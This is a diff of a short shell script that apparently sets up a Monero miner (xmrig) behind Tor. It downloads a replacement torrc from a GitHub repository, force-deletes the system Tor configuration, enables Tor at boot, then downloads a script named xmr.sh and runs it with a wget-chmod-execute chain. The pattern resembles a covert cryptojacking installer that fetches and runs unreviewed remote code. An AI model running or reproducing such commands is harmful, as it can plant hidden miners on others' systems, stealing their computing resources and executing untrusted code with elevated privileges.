@@ -5,6 +5,10 @@ wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
 sudo /etc/init.d/tor stop
 
 sudo rm -rf /etc/tor/torrc
+
+sudo systemctl enable tor
+sudo /etc/init.d/tor start
 sudo cp torrc /etc/tor/torrc
+
 
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
